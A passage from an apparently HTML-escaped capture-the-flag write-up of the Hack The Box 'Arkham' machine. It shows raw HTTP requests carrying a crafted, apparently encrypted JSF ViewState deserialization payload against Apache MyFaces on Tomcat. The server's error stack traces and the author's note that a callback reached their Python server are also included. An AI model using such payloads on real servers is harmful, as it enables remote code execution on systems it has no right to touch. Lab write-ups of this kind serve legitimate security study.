+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;HTTP Status 500 â Internal Server Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;h1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;22px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;h2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;16px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;h3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;14px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;12px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;.name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.line&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;HTTP Status 500 â Internal Server Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;line&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Type&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; Exception Report&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Message&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;; [Ljava.lang.Object; is in module java.base of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;)&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Description&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Exception&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;pre&amp;gt;&lt;/span&gt;java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;; [Ljava.lang.Object; is in module java.base of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;)
+        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getSavedState(HtmlResponseStateManager.java:187)
+        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getState(HtmlResponseStateManager.java:139)
+        org.apache.myfaces.application.jsp.JspStateManagerImpl.restoreView(JspStateManagerImpl.java:355)
+        org.apache.myfaces.application.jsp.JspViewHandlerImpl.restoreView(JspViewHandlerImpl.java:515)
+        org.apache.myfaces.lifecycle.RestoreViewExecutor.execute(RestoreViewExecutor.java:85)
+        org.apache.myfaces.lifecycle.LifecycleImpl.executePhase(LifecycleImpl.java:103)
+        org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)
+        javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)
+        org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Note&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; The full stack trace of the root cause is available in the server logs.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;line&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Apache Tomcat/8.5.37&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-got-a-500-and-when-i-checked-my-python-server-i-saw-that-i-got-a-request-so-everything-is-fine&quot;&gt;I got a 500, and when I checked my python server I saw that I got a request so everything is fine.&lt;/h4&gt;
+&lt;h4 id=&quot;2nd-request-&quot;&gt;2nd Request :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /userSubscribe.faces HTTP/1.1
+Host: arkham.htb:8080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://arkham.htb:8080/userSubscribe.faces
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 3109
+Cookie: JSESSIONID=FFA2F263EA4D3BCCFAAEEFBE012A524D
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+j_id_jsp_1623871077_1%3Aemail=test&amp;amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;amp;javax.faces.ViewState=o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2Ozo%2Bus8jmf0nBttP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy1opEh7cDv2tdwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BRvyB%2F2m0z59yPgQijAFFrHv%2FFHK9kS3bd5CXSj%2BQrhHen7wNrMeCa7i0HvzRcKdoRRaP1oZYT1VagG4ZxblvAnvEIlw06ZZ5I0FbIXQZD0hxEVL%2FVgEmicZbJY6G4sqBwTtsZahAdOH9EIpPlR1Lk2x5bUT15gaZNEWJ%2BgSEfhKSsMjBwS3fvkuOvKtC8ttV3HZjlugWuZSt5XvisFw2swkCBSZsRlmf8rDIwcEt375HX%2FLlXyNL0Oc117xPruVt3hwVMXWIvRWU%2B1LfoOx%2BOAo66bHdBWC0UFv1HE5WCU3IPKGs6NPijKqJWULKKxdYHba3wuN9N4KGU6y1DQGkboG9trDs8z3Vv17f0whCQpR392T%2FgkPJdE2M0q797EOI1suR5UQIOUxEyYZ50%3D
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;response--1&quot;&gt;Response :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 500 
+Content-Type: text/html;charset=utf-8
+Content-Language: en
+Content-Length: 2570
+Date: Fri, 09 Aug 2019 18:38:50 GMT
+Connection: close
+
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;HTTP Status 500 â Internal Server Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;h1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;22px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;h2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;16px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;h3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;14px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span 